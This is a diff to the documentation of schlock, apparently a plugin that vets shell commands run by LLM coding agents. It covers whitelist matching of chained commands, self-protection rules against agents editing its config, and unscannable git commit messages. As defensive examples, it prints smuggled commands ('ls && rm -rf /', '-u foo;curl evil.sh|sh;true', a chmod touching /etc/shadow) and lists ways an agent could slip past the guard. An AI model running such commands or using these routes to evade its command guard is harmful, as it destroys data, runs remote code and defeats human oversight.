@@ -119,14 +119,45 @@ whitelist:
 
 #### How It Works
 
-- Patterns are regex, matched against the start of the command string (like `re.match()`)
+- Patterns are regex, matched against the start of a **single command** (like `re.match()`)
 - A match bypasses ALL rule checks — the command is allowed unconditionally
+- A command carrying `..` or a redirection (`<`, `>`, including `2>&1`) is never whitelisted, as one
+  command or as a pipeline; it is judged by the rules instead
 - User whitelist patterns merge with built-in whitelist patterns from the plugin
 - Invalid regex patterns are skipped with a warning (won't crash the validator)
 
+A command **line** with several commands in it (`a && b`, `a; b`, `a | b`) is checked one
+command at a time, and your pattern is applied to each command separately. It is not enough
+for your pattern to match the front of the line — `^ls` does not whitelist `ls && rm -rf /`,
+it whitelists the `ls`, and the `rm -rf /` is still judged on its own.
+
+To whitelist a whole pipeline as one unit, **write the separator into the pattern** and anchor
+it end to end:
+
+```yaml
+whitelist:
+  # Whitelists this pipeline as a whole; `gh auth token` alone stays blocked.
+  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+ghcr\.io\s+-u\s+[A-Za-z0-9._@-]+\s+--password-stdin$
+```
+
+Your pattern is then held to the number of commands it declared. That entry writes one
+separator, so it speaks for exactly two commands; if the line turns out to hold three, the
+entry does not cover it and every command is judged on its own. This matters because a loose
+slot such as `\S+` happily matches a `;` — had the user slot above been `\S+`,
+`-u foo;curl evil.sh|sh;true` would satisfy the pattern end to end, and counting is what
+refuses it.
+
+Write the pipeline on one line or several, as you like: a newline after `|` or `&&` is a
+continuation, not an extra command, and is counted as such.
+
+A pattern with no `|`, `&` or `;` in it is read as describing one command, and will never
+clear a multi-command line on its own — that is deliberate, and it is what stops a broad
+entry silently vouching for whatever an agent appends to it.
+
 #### Writing Good Patterns
 
-Whitelist patterns use prefix matching (anchored at the start, not the end). Write patterns specific enough to avoid unintended matches:
+Whitelist patterns match from the start of a command and, unless you anchor them, run to
+whatever follows. Write patterns specific enough to avoid unintended matches:
 
 ```yaml
 # GOOD: Specific command with anchored end
@@ -140,9 +171,23 @@ whitelist:
 # BAD: Too broad — matches ALL gcloud commands including dangerous ones
 whitelist:
   - ^gcloud
+
+# BAD: anchored but greedy — ".*" accepts any arguments at all, so the "$" pins
+# nothing (it cannot clear a chained command, since it writes no separator)
+whitelist:
+  - ^npm\s+run\s+.*$
 ```
 
-Use `$` at the end when you want to match the exact command. Without `$`, the pattern matches any command that starts with the pattern text.
+Use `$` at the end when you want to match the exact command. Without `$`, the pattern matches
+any command that starts with the pattern text — including extra arguments you did not intend
+to allow, so `^chmod\s+[0-7]{3}\s+/tmp/` also clears `chmod 755 /tmp/x /etc/shadow`.
+
+Spell out the characters each slot accepts (e.g. `[\w./:-]+`) rather than using `.*` or `\S+`,
+which match `;`, `&`, `|`, `>` and `${IFS}` happily.
+
+Excluding separators is not enough for a path or host slot: `[\w./:-]+` still accepts `..` and
+`host.evil.com`. Pin a host literally and reject `.` / `..` segments; the built-in `rm -rf` and
+`gh auth token` entries in `00_whitelist.yaml` show the shape.
 
 #### Security: User-Level Only
 
@@ -176,11 +221,11 @@ Categories are derived from rule file names (strip numeric prefix and extension)
 
 #### Self-Protection
 
-The `self_protection` category contains BLOCKED rules that prevent LLM agents from modifying schlock's own configuration files. These rules are enforced at three layers:
+The `self_protection` category contains BLOCKED rules that prevent LLM agents from modifying schlock's own configuration files and its vendored parser files (`.claude-plugin/bin/`, `.claude-plugin/vendor/`). These rules are enforced at three layers:
 
 1. **YAML rules** (BLOCKED) — standard rule matching, cannot be overridden
-2. **Hardcoded allowlist check** — when a config path is detected in a command, only known read-only commands (cat, grep, ls, head, tail, stat, diff, jq, etc.) are permitted; all other commands are blocked
-3. **Dedicated PreToolUse hook** (`self_protect.py`, matcher `Write|Edit|MultiEdit|NotebookEdit`) — blocks Write/Edit tool calls targeting config files
+2. **Hardcoded allowlist check** — when a protected path is detected in a command, only known read-only commands (cat, grep, ls, head, tail, stat, diff, jq, etc.) are permitted; all other commands are blocked, including readers that can run another program (e.g. rg, bat, less, view) and any command that also carries a `VAR=` prefix or another non-read step
+3. **Dedicated PreToolUse hook** (`self_protect.py`, matcher `Write|Edit|MultiEdit|NotebookEdit`) — blocks Write/Edit tool calls targeting protected paths
 
 The allowlist approach (layer 2) is secure by default: new or unknown commands are blocked without needing to enumerate every possible write tool. This prevents bypass via obscure commands like `ln`, `dd`, `rsync`, or scripting languages.
 
@@ -247,8 +292,17 @@ The blocker scans the **command string**. Some git forms deliver the commit mess
 *outside* the command, so there is nothing in the command to scan (issue #76):
 
 - `git commit -F <file>` / `git commit --file=<file>` — message lives in a file
-- `git commit -F -` and heredocs — message arrives on stdin at execution time
+- `git commit -F -` fed by a **piped** or **interactive** stdin — the bytes live in a prior
+  pipe segment or are typed at execution time, not in the command string
 - `git commit -m "$(cat file)"` / backticks — the substitution is not expanded yet
+- more than `_MAX_HEREDOC_OPENERS` heredocs in one Bash call — refuses to guess rather than
+  scan unboundedly (a documented cap, not a delivery form)
+
+`git commit -F -` / `--file -` fed by an **in-command heredoc** (`git commit -F- <<EOF`) is
+different: its bytes ARE in the command string, so it is scanned like any other message,
+regardless of how many other heredocs (a `gh pr create --body-file -` in the same Bash call,
+a leading `cat <<DATA`, …) share the call — each heredoc body is bound to its own `<<` opener
+in source order.
 
 Because a `PreToolUse` hook runs **before** the command executes, this content does not exist
 where the hook can see it. The `unscannable_message_action` setting decides what happens when
@@ -629,7 +683,7 @@ Include in your project README:
 
 ### Code Quality Tools
 
-This project uses [schlock](https://github.com/27Bslash6/schlock) for:
+This project uses [schlock](https://github.com/27b-io/schlock) for:
 - Bash command safety validation (always on)
 - Automatic code formatting (Python: ruff, JS/TS: prettier)
 - Clean commit history (no advertising)
@@ -713,4 +767,4 @@ export SCHLOCK_DEBUG=1
 1. **Check logs:** stderr output from hooks
 2. **Enable debug mode:** `export SCHLOCK_DEBUG=1`
 3. **Review audit log:** `~/.config/schlock/audit.jsonl`
-4. **File issue:** https://github.com/27Bslash6/schlock/issues
+4. **File issue:** https://github.com/27b-io/schlock/issues
